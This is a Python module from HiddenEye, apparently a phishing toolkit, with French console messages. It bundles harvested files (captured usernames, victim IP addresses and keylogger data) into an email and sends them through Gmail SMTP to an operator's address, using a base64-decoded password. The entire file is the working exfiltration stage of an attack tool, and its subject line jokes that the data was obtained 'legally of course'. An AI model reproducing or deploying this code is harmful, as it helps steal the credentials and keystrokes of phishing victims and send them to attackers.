#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#

import os
import base64
import smtplib
import emailconfig
from os import system
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

COMMASPACE = ', '


def main():
    system('touch Defs/Send_Email/attachments/READ_IT.txt && touch Defs/Send_Email/attachments/usernames.txt && touch Defs/Send_Email/attachments/ip.txt && touch Defs/Send_Email/attachments/KeyloggerData.txt')

    # Decoding Password from (Defs/Send_Email/emailconfig.py) ..
    gmail_password = base64.b64decode(emailconfig.gmail_password)
    gmail_password = (gmail_password.decode('utf-8'))

    # Create the enclosing (outer) message

    outer = MIMEMultipart()
    outer['Subject'] = "[ HIDDENEYE ]:: ICI CE TROUVE LES DONNÉES TÉLÉCHARGÉ. (DE FAÇON LÉGAL BIEN SUR)"
    outer['To'] = emailconfig.recipient_email
    outer['From'] = emailconfig.gmail_account
    outer.preamble = ''
    # List of attachments
    print('[.] Adding Attachments...')
    attachments = ['Defs/Send_Email/attachments/READ_IT.txt', 'Defs/Send_Email/attachments/ip.txt',
                   'Defs/Send_Email/attachments/usernames.txt', 'Defs/Send_Email/attachments/KeyloggerData.txt']
    print('[.] Attachments Added.')
    # Add the attachments to the message
    for file in attachments:
        try:
            with open(file, 'rb') as fp:
                msg = MIMEBase('application', "octet-stream")
                msg.set_payload(fp.read())
            encoders.encode_base64(msg)
            msg.add_header('Content-Disposition', 'attachment',
                           filename=os.path.basename(file))

            outer.attach(msg)
        except:
            print("[.] Impossible d'ouvrir une des pièces jointes. Une erreur s'est produite !  ")
            raise

    composed = outer.as_string()

    # Send the email
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.ehlo()
            s.starttls()
            s.ehlo()
            print('[.] TENTATIVE DE CONNEXION NUMERO 69...')
            s.login(emailconfig.gmail_account, gmail_password)
            print('[.] CONNEXION EFFECTUÉ AVEC SUCCÉS')
            print('[.] ENVOIE DES DONNÉES A L\'ADRESSE MAIL CIBLE...')
            s.sendmail(emailconfig.gmail_account,
                       emailconfig.recipient_email, composed)
            print('[.] LA CIBLE ALPHA A BIEN ÉTÉ ENVOYÉ JE RÉPETE LA CIBLE ALPHA A ÉTÉ ENVOYÉ. Fin.')
            s.close()
        print('')
        print("[+] JETTE UN COUP D\'OEUIL DANS TA BOITE DE RÉCÉPTION MAIL.")
    except:
        print("[^] IMPOSSIBLE D'ENVOYÉ LA CIBLE ALPHA UNE ERREUR A ÉTÉ RENCONTÉ ! ")


if __name__ == '__main__':
    main()
